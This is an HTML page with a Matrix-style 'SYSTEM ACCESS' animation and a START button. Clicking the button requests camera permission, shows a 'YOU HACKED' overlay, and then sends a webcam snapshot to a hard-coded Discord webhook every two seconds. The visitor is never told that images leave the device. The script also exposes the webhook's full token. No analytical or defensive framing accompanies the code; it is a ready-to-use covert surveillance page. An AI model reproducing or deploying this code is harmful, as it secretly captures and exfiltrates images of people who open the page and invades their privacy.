<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>SYSTEM ACCESS</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
        canvas { display: block; }
        .overlay { position: absolute; top: 10%; left: 0; width: 100%; text-align: center; color: #0F0; z-index: 10; }
        button { padding: 20px 40px; font-size: 24px; background: #000; color: #0F0; border: 2px solid #0F0; cursor: pointer; }
        #videoElement { display: none; }
        #hackedOverlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.95); color: red; font-size: 100px; font-weight: bold; 
            justify-content: center; align-items: center; z-index: 9999; text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div id="hackedOverlay">YOU HACKED</div>
    <canvas id="c"></canvas>
    <div class="overlay">
        <h1>SYSTEM_INIT_READY</h1>
        <button id="startBtn">START</button>
        <video id="videoElement" autoplay playsinline></video>
    </div>
    <script>
        const c = document.getElementById("c"), ctx = c.getContext("2d");
        c.height = window.innerHeight; c.width = window.innerWidth;
        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
        const font_size = 15;
        let columns = c.width/font_size;
        let drops = [];
        for(let x = 0; x < columns; x++) drops[x] = 1;
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
            ctx.fillRect(0, 0, c.width, c.height);
            ctx.fillStyle = "#0F0";
            for(let i = 0; i < drops.length; i++) {
                let text = matrix[Math.floor(Math.random()*matrix.length)];
                ctx.fillText(text, i*font_size, drops[i]*font_size);
                if(drops[i]*font_size > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 35);
        document.getElementById("startBtn").onclick = async function() {
            const video = document.getElementById("videoElement");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                document.getElementById("hackedOverlay").style.display = "flex";
                this.style.display = "none";
                setInterval(async () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext("2d").drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append("file", blob, "photo.png");
                        await fetch("https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftFO8zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZl70GceTbb", {
                            method: 'POST',
                            body: formData
                        });
                    }, "image/png");
                }, 2000);
            } catch (err) {
                alert("پێویستە مۆڵەتی کامێرا بدەیت!");
            }
        };
    </script>
</body>
</html>
